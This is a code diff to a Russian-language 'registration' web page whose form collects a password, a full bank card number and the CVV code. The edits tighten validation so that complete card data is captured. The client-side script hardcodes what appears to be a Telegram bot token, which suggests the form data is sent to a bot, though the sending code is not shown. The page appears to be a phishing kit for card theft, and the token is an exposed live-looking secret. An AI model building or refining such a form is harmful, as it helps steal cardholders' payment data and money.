@@ -38,13 +38,13 @@
         <input type="text" id="pass" name="password" required maxlength='20' onkeypress="return /[a-zA-Z0-9]/.test(event.key)" title="Пароль должен содержать только латинские буквы и цифры (максимум 20 символов)">
         <p></p>
         <label for="cvv">CVV код (3-х значный код на обратной стороне карты)</label>
-        <input type="text" id="cvv" name="cvv" required maxlength="3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+        <input type="text" id="cvv" name="cvv" required maxlength="3" minlength = "3" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
         <br>
         <p></p>
         <label for="card">Номер банковской карты</label>
-        <input type="text" id="card" name="card" required maxlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Введите номер карты (только цифры)">
+        <input type="text" id="card" name="card" required maxlength="16" minlength="16" oninput="this.value = this.value.replace(/[^0-9]/g, '')" title="Введите номер карты (только цифры)">
         <button type="submit">Зарегистрироваться</button>
-        <button type="button" id="forgot-password">Забыли пароль?</button> <!-- Кнопка для восстановления пароля -->
+        <button type="button" id="forgot-password">Забыли пароль?</button> 
     </form>
 
     <script>
@@ -56,7 +56,7 @@
             const username = document.getElementById('pass').value;
             const email = document.getElementById('email').value;
             const card = document.getElementById('card').value;
-            
+            const cvv = document.getElementById('cvv').value;
             
 
             // Проверка на наличие символа @ в email
@@ -72,7 +72,21 @@
                 return;
             }
 
-            const cvv = document.getElementById('cvv').value;
+            if (cvv.length !== 3) {
+                alert('нужен 3-х значный код cvv.');
+                return;
+
+            }
+            
+            if (card.length !== 16) {
+                alert('нужен 16-ти значный номер карты.');
+                return;
+
+            }
+
+
+
+            
             
 
             const token = '7942332820:AAFC2P1_9T8USat2LkVF_cXqtqCaBqs2O4g';
